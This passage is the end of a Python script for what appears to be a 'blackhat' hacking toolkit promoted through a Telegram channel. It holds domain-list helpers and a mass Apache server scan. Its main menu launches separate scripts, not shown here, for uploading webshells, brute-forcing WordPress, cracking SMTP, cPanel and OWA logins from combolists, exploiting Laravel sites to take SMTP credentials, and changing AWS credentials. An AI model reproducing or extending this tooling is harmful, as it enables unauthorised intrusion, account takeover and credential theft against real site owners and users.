                    https_domains.append("https://" + domain[7:])
                elif domain.startswith("https://"):
                    http_domains.append("http://" + domain[8:])
                    
        with open(http_output_file, 'w') as http_out_file:
            http_out_file.write('\n'.join(http_domains))
        
        with open(https_output_file, 'w') as https_out_file:
            https_out_file.write('\n'.join(https_domains))
        
        print(f"HTTP domains saved to {http_output_file}")
        print(f"HTTPS domains saved to {https_output_file}")
        
        # Return to the main_menu() after processing
        main_menu()
        
    except FileNotFoundError:
        print("Error: File not found.")
        main_menu()
    except Exception as e:
        print("Error:", e)
        main_menu()

#add-http-https-end

#no-string-domain
def extract_domains(file_name):
    CHUNK_SIZE = 100000  # Adjust the chunk size as needed

    try:
        output_file = "no-string-domain.txt"
        domains = []

        with open(file_name, 'r', errors='ignore') as f:
            for line in f:
                url = line.strip()
                parsed_url = urlparse(url)
                domain = parsed_url.netloc if parsed_url.netloc else parsed_url.path.split('/')[0]
                domains.append(parsed_url.scheme + "://" + domain)

        with open(output_file, 'w') as out_file:
            out_file.write('\n'.join(domains))
             
        print(f"Domains extracted and saved to {output_file}")
        
        # Return to the main_menu() after processing
        main_menu()
        
    except FileNotFoundError:
        print("Error: File not found.")
        main_menu()
    except Exception as e:
        print("Error:", e)
        main_menu()

#no-string-domain-end

#find-string-to-domain
def find_strings(no_string_file, string_file, output_file):
    CHUNK_SIZE = 100000  # Adjust the chunk size as needed

    try:
        with open(no_string_file, 'r') as no_string_f:
            no_string_urls = no_string_f.readlines()

        with open(string_file, 'r') as string_f:
            string_urls = string_f.readlines()

        found_strings = set()
        for no_string_url in no_string_urls:
            no_string_url = no_string_url.strip()
            for string_url in string_urls:
                if no_string_url in string_url:
                    found_strings.add(string_url.strip())

        with open(output_file, 'w') as output_f:
            for found_string in found_strings:
                output_f.write(found_string + '\n')

        print(f"Found strings have been saved to {output_file}")
        
        # Return to the main_menu() after processing
        main_menu()

    except FileNotFoundError as e:
        print(f"Error: {e}")
        main_menu()
    except Exception as e:
        print("Error:", e)
        main_menu()

#find-string-to-domain-end

#filter-custom-domain
def custom_domain_split(tlds, file_name):

    CHUNK_SIZE = 100000  # Adjust the chunk size as needed


    try:
        
        file_handles = {}
        
        
        for tld in tlds:
            file_handles[tld] = open(f"{tld}.txt", "w")
        
        
        with open(file_name, "r") as f:
            for line in f:
                domain = line.strip()
                for tld in tlds:
                    if domain.endswith(tld):
                        file_handles[tld].write(domain + "\n")
                        break
        
        
        for file_handle in file_handles.values():
            file_handle.close()
        
        print("Domains have been split based on the specified TLDs.")

        main_menu()

    except FileNotFoundError:
        print("Error: File not found.")
        main_menu()
    except Exception as e:
        print("An error occurred:", e)
        main_menu()
#filter-custom-domain-

#http-server-check

def check_server(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            server_info = response.headers.get('Server', 'Unknown')
            if server_info.startswith('Apache'):
                return f"{url} | {server_info}"
            else:
                return None
        else:
            return None
    except requests.exceptions.RequestException:
        return None

def save_result(result):
    if result:
        with open('http-results.txt', 'a') as file:
            file.write(f"- > {result}\n")

def process_url(url):
    if not urlparse(url).scheme:
        url = "http://" + url
    result = check_server(url)
    if result:
        click.echo(f"{url} -> {click.style('OK', fg='green')}")
        save_result(result)
    else:
        click.echo(f"{url} -> {click.style('Unknown', fg='red')}")

def htpp_server():
    print("MASS LOOKUP HTTP SERVER BY @maybe_syndicatestore_blackhat | CHANNEL: t.me/syndicatestore_blackhat")
    file_name = input("lista?: ")
    with open(file_name, 'r') as file:
        urls = file.read().splitlines()

    pool = ThreadPool(5)
    pool.map(process_url, urls)
    pool.close()
    pool.join()
#http-server-check-end
def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[95m
 +-+-+-+-+-+-+-+ 
 |E|x|p|l|0|i|t| channel: t.me/syndicatestore_blackhat
 +-+-+-+-+-+-+-+ 
             - VIP PREMIUM TOOLS! -  

    |----------|
    | EXPL0IT  |                                                                                                            
    |----------|              

   |----------|
  [1] Expl0it Shells | Uploaders | Wso | Filemanger
  [2] Expl0it FTPs | SSH | FTP |
  [3] Bruteforce WordPress | Take Over Weak Accounts
  [4] Webshell Alive Or Dead Checker
  [5] Webshell Lookup Uname Servers

    |----------|
    | GRABBERS |                                                                                                            
    |----------|              

   |----------|
  [6] Grab Domains By Date 
  [7] Zone-h Grabber Domains
  [8] ReverseIP | api.webscan.cc | rapiddns.io | askdns.com

    |----------|
    |   IPS    |                                                                                                            
    |----------|              

   |----------|
  [9] Domain To IPS
  [10] Range IPS
  [11] Generate Random IPS
  [12] ASN IPS Grabber Asn Method To Get IPS

    |----------|
    | LARAVEL  |                                                                                                            
    |----------|              

   |----------|
  [13] Laravel BOT | Get SMTPs Laravel + 1256 Path Priv8 2024
  [14] Auto Check Laravel | Apache Symfony | Wordpress site/ip
  [15] Mass Check Sengrid Limit | Send Test In Your Mail
  [16] Mass Change User+Pass Aws | Send In Your Mail
  [17] Auto Filter Mailist | Hotmail, Yahoo, Gmail

    |----------|
    | CRACKER  |                                                                                                            
    |----------|              

   |----------|
  [18] SMTPs Combo Cracker Custom Host 
  [x18] SMTPs Combo Cracker Unlimited
  [19] Owa Webmail Cracker
  [x20] Crack cPanel | Whm | Webmail | SMTPs | WordPress from ComboList
  [X21] WordPress Login Checker | Filemanager | Plugins-Installed
  
  
    |----------|
    | CHECKER  |                                                                                                            
    |----------|              

   |----------|
  [20] Mass Check SMTPs | Send Test In Your Mail
  [21] Mass Check FTP | SFTP | FTP | SSH

    |----------|
    | CONFIGURE|                                                                                                            
    |----------|              

   |----------|
  [22] Sort Lines Lexicographically Ascending
  [23] Add https:// & Http://
  [24] Extract Domain
  [25] Url to String
  [26] Filter Custom Domain | .com | .net | .org 
  [27] Mass Scan http server
  [28] Domain Clean Duplicate

  [0] EXIT
""")
    choice = input("Select number :P : ")

    print("Choice selected:", choice)  # Debugging print statement

    if choice == "1":
        # Finding Webshell From Weblist 
        print("""
   Enjoy :P
   Contact: @maybe_syndicatestore_blackhat
""")
        pr()
    elif choice == "2":
        # Finding FTP & SSH ACCOUNTS IN WEBLIST
        ftp_hunter_menu()
    elif choice == "3":
      os.system(r'py -3 configure\BruteforceWP.py')
    elif choice == "4":
       # Checking Alive Webshell in Webshell List
       webshell_checker()
    elif choice == "5":
        # Checking Uname Webshell Server in Webshell List
        os.system(r'py -3 configure\UnameChecker.py')
    elif choice == "6":
        # Grabber Domains By Date Starter
        grab_domains_by_date() 
    elif choice == "7":
        # Zone-H Grabber Get A vuln Weblist
        zonehh()
    elif choice == "8":
       # ReverseIP Get A Weblist From IPs List
       reverse_ip_menu()
    elif choice == "9":
        # Domain To IPS from Weblist
        domain_to_ip()
    elif choice == "10":
        # Range IPS From IPLIST
        range_ips()
    elif choice == "11":
        # Generate Random IPS
        os.system(r'py -3 configure\generatorips.py')
    elif choice == "12":
        # ASN IPS GRABBER + ASN METHOD TO GET IPS
        os.system(r'py -3 configure\asn.py')
    elif choice == "13":
        # Exploit Laravel Get A SMTPs From Weblist
        os.system(r'py -3 laravel\start.py')               
    elif choice == "14":
        # Auto Check Laravel Apache Symfony And Wordpress site/ip
        os.system(r'py -3 configure\laravel+symfony.py') 
    elif choice == "15":
        # Mass Check Sengrid Limit And Send Test In Your Mail
        os.system(r'py -3 configure\check_sendgrid+test.py') 
    elif choice == "16":
        # Mass Change User+Pass Aws | Send In Your Mail
        os.system(r'py -3 configure\changeAws+test.py') 
    elif choice == "17":
        # Auto Filter Mailist Hotmail, Yahoo, Gmail
        os.system(r'py -3 configure\filter_email.py') 
    elif choice == "18":
        # SMTPs Cracker Combos
        os.system(r'py -3 configure\SMTPsCracker.py') 
    elif choice == "x18":
         os.system(r'py -3 smtpcombo.py')    
    elif choice == "19":
        # Owa Webmail Cracker 
        os.system("py -3 OwaWebmail.py")
    elif choice == "20":
        # Mass Check SMTPs | Send Test In Your Mail
        os.system(r'py -3 configure\SMTPsChecker.py')
    elif choice == "x20":
        # Crack cPanel | Whm | Webmail | SMTPs | WordPress from ComboList
        os.system(r'py -2 configure\01234$combocr.py')
    elif choice == "x21":
        # WordPress Login Checker | Filemanager | Plugins-Installed
        os.system(r'py -2 configure\0123$wp.py')                
    elif choice == "21":
        # Mass Check FTP | SFTP | FTP | SSH
        ftp_sub_menu()
    elif choice == "22":
        # Sort Lines Lexicographically Ascending
        file_name = input("Enter the file name: ")
        sort_lines_lexicographically(file_name)
    elif choice == "23":
        # Add https:// & Http://
        file_name = input("Enter the file name: ")
        add_http_https(file_name)
    elif choice == "24":
        # Extract Domain
        file_name = input("Enter the file name: ")
        extract_domains(file_name)
    elif choice == "25":
        # Url to String
        file_name_without_string = input("Enter the file name (without string): ")
        file_name_with_string = input("Enter the file name (with string): ")
        output_file = "founded-string.txt"
        find_strings(file_name_without_string, file_name_with_string, output_file)
    elif choice == "26":
        # Filter Custom Domain | .com | .net | .org 
        print("Enter the domain names (ex:.com .net .org):")
        tlds_input = input("TLDs: ").split()

        if len(tlds_input) < 3:
            print("Please provide at least 3 top-level domains.")
        else:
            print("Enter the file name containing the list of domains:")
            file_name = input("File Name: ")
            custom_domain_split(tlds_input, file_name)
    elif choice == "27":
        # Mass Scan http server
        htpp_server()
    elif choice == "28":
        # clean_web()
        clean_web()                                               
    elif choice == "0":
        sys.exit(0)
    elif choice.strip() == "":
        main_menu()
    else:
        print("Invalid choice. Please select a valid option.")
main_menu()